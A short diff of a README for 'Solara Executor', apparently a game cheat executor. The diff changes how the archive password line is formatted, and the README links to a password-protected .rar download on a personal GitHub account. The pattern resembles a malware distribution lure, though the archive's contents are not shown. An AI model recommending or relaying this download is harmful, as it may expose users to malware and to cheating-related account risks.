@@ -1,7 +1,7 @@
 # Solara Executor 🌟
   Status:Work✅
 
-pass🔑 - (SolaraV3)
+[pass🔑 - SolaraV3]
 
 👉 [Press Here To Install](https://github.com/ivonsilva1/Solara-Executor/releases/download/Solara/Solara.rar) 👈  
 
